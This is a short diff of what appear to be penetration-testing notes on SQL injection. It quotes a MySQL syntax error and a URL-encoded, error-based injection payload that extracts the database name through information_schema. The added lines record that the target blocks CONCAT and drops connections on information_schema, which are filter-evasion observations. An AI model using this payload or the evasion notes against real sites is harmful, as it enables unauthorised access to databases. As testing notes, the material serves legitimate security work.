@@ -9,6 +9,9 @@ You have an error in your SQL syntax; check the manual that corresponds to your 
 
 '+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(DATABASE()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--
 
+Blocking the CONCAT
+When information_schema is coming it is breaking the connection
+
 
 
 
